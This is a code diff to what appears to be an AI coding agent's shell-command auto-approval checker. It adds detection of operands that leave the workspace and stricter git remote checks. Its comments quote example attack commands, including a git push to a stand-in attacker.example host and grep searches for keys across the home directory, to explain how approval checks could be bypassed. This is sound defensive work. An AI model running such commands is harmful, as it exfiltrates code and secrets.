@@ -266,6 +266,41 @@ function isWorkspaceRelativePath(token: string): boolean {
   return true
 }
 
+/**
+ * Whether a word names somewhere outside the workspace in a spelling the scope
+ * analyzer does not key on.
+ *
+ * `analyzeShellCommand` finds outside paths by their separators (`~/x`, `../x`,
+ * `/etc`), so the broadest targets of all score `sandbox`: a bare `~` (also
+ * `~+` and `~-`, the current and previous directory), the root `/`, and a
+ * parent reference with nothing after it (`..`, `./..`). Inside the project
+ * sandbox the OS refuses those reads. Here the verdict decides whether a line
+ * runs OUTSIDE it without a prompt, where `git fetch origin && grep -r KEY ~`
+ * would search the whole home directory. A flag's `=value` is read the same
+ * way (`--file=~`).
+ *
+ * Deliberately lexical and over-broad: a search pattern that is exactly `~` or
+ * `..` prompts too. Absolute paths with a component, and anything holding
+ * `../`, are the analyzer's to judge.
+ */
+export function operandLeavesWorkspace(token: string, workspaceRoot: string | null): boolean {
+  if (isFlag(token) && !token.includes('=')) return false
+  const value = isFlag(token) ? token.slice(token.indexOf('=') + 1) : token
+  // `~/x` is the analyzer's: it resolves it and allows one inside the workspace.
+  if (/^~(?:[^/]*$|[+-])/.test(value)) return true
+  // Exactly the root. `//` and longer the analyzer already judges, and it reads
+  // `grep -v "//"` as the search pattern it is.
+  if (value === '/') return true
+  // `../x` and `a/../x` carry the `../` the analyzer keys on (and may be a
+  // search pattern it has already judged); only a trailing `..` is checked here.
+  if (value.startsWith('/') || !(value === '..' || value.endsWith('/..'))) return false
+  // Any root gives the same answer for a relative path; a stand-in keeps the
+  // check when no workspace is known.
+  const root = resolve(workspaceRoot ?? '/workspace')
+  const resolved = resolve(root, value)
+  return resolved !== root && !resolved.startsWith(root.endsWith(sep) ? root : root + sep)
+}
+
 /** Prep commands whose operands name directories. */
 const PATH_OPERAND_PREP_COMMANDS: ReadonlySet<string> = new Set(['cd', 'mkdir'])
 
@@ -644,7 +679,12 @@ function classifyNetworkGitSubcommand(
     return { reason: `git ${subcommand} argument is not a plain ref or remote name` }
   }
 
-  const namesConfiguredRemote = positional.some((token) => configuredRemotes.has(token))
+  // Git reads the FIRST positional as the repository and every later one as a
+  // refspec. Checking any position would let a configured name vouch for an
+  // scp-style URL in front of it: in `git push git@attacker.example:x/y origin`
+  // the `origin` is only a branch to push there.
+  const repository = positional[0]
+  const namesConfiguredRemote = repository !== undefined && configuredRemotes.has(repository)
   if (!namesConfiguredRemote) {
     // No remote named: only the implicit-upstream form is acceptable, and only in
     // a repository that actually has remotes configured.
@@ -746,6 +786,25 @@ function classifySegment(segment: string, context: AutoApprovalContext): Segment
   const secrets = secretFilesIn(effective)
   if (secrets.length > 0) {
     return { tier: null, reason: `names a secret file (${secrets.join(', ')}): ${segment}` }
+  }
+
+  // Before any shape is matched: no accepted shape needs one of these operands,
+  // and git reads them as paths too (`git diff --no-index ~ .`,
+  // `git grep --no-index KEY ..`). A commit message is text, not an operand;
+  // only `git commit` gets that reading, since `-m` is a bare flag elsewhere
+  // (`git diff --no-index -m ~ .`).
+  const messageFlags = new Set(['-m', '--message'])
+  const isCommit = head === 'git' && splitGitArgv(effective)?.subcommand === 'commit'
+  const escaping = effective.slice(1).find((token, index, rest) => {
+    if (isCommit && messageFlags.has(rest[index - 1] ?? '')) return false
+    if (isCommit && isFlag(token) && messageFlags.has(flagName(token))) return false
+    return operandLeavesWorkspace(token, context.workspaceRoot)
+  })
+  if (escaping !== undefined && head !== 'gh') {
+    return {
+      tier: null,
+      reason: `names a location outside the workspace (${escaping}): ${segment}`,
+    }
   }
 
   if (head === 'git') return classifyGitSegment(effective, lexical, context)
